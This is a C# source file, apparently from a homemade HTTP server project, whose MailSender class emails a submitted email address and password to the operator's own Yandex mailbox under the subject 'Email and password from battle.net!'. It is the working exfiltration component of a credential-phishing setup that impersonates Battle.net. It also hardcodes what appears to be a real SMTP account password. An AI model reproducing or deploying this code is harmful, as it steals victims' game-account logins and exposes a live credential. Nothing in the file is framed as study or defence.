using MimeKit;
using MailKit.Net.Smtp;
using static System.Net.WebRequestMethods;
using MyHttpServer;
using Org.BouncyCastle.Asn1.Ocsp;
using System.Web;
using System.Net;

namespace MyHttpServer
{
    public class MailSender
    {
        private static readonly string _serverMail = "jinx.httpserver@yandex.ru";
        private static readonly string _serverPassword = "kfgxrkizhidqhnyd";

        public static void SendEmail(string email, string password)
        {
            try
            {
                using var message = new MimeMessage();
                using var smtpClient = new SmtpClient();

                message.From.Add(new MailboxAddress("HTTP Server", _serverMail));
                message.To.Add(new MailboxAddress("", _serverMail));
                message.Subject = "Email and password from battle.net!";
                var bodyBuilder = new BodyBuilder();
                message.Body = new TextPart(MimeKit.Text.TextFormat.Html)
                {
                    Text = $"<body style=\"font-family: Arial, sans-serif; background-color: #ffffff; " +
                    $"margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; " +
                    $"min-height: 100vh;\"><div style=\"background-color: #15171E; padding: 20px; " +
                    $"border-radius: 10px; box-shadow: 0 0 10px rgba(0, 0, 0, 0.2); height: 300px; width: 500px; " +
                    $"text-align: center; color: #ffffff; display: flex; flex-direction: column; justify-content: center;\">" +
                    $"<h1 style=\"font-size: 30px;\">Your Account Information</h1>" +
                    $"<h4 style=\"font-size: 24px; font-style: bold;\">Email: {email}</h4><h4 style=\"font-size: 24px;font-style: bold;\">" +
                    $"Password: {password}</h4></div></body>"
                };

                smtpClient.Connect("smtp.yandex.ru", 465, true);
                smtpClient.Authenticate(_serverMail, _serverPassword);
                smtpClient.Send(message);
                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine("==== Message sent! ====\n");
                Console.ResetColor();
                smtpClient.Disconnect(true);
                
            }
            catch (Exception ex)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine($"Failed to send mail message: {ex.Message}");
                Console.ResetColor();
            }
        }
    }
}


